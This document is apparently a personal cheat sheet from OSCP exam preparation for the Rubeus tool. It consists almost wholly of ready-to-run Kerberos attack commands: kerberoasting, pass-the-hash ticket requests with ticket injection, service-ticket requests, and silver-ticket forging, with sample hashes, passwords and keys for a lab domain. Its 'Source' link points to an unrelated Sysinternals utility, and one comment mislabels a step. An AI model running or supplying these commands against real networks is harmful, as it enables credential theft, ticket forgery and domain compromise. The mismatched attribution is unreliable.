# Name
Rubeus

## Usage
```
.\Rubeus.exe kerberoast

# Uses NTLM hash to request kerberoast ticket
.\Rubeus.exe asktgt /domain:oscp.exam /user:celia.almeda /rc4:e728ecbadfb02f51ce8eed753f3ff3fd /ptt

# Build service tickets using TGT
.\Rubeus.exe asktgs /user:celia.almeda /ticket:<ticket>  /service:LDAP/dc01.oscp.exam  /dc:dc01.oscp.exam /ptt /nowrap

# Building silver ticket
.\Rubeus.exe hash /user:web_svc /domain:oscp.exam /password:Diamond1

.\Rubeus.exe silver /service:web_svc/dc01.oscp.exam /rc4:E728ECBADFB02F51CE8EED753F3FF3FD /sid  S-1-5-21-2610934713-1581164095-2706428072-1105 /creduser:oscp.exam\Administrator /credpassword:P@ssw0rd /user:celia.almeda /krbkey:B780A8DC652DFDAAD8B32D7352F00B90BA3E42EDA8B076197738B08CDA12A184 /krbenctype:aes256 /domain:oscp.exam /ptt
```

## Source
https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe

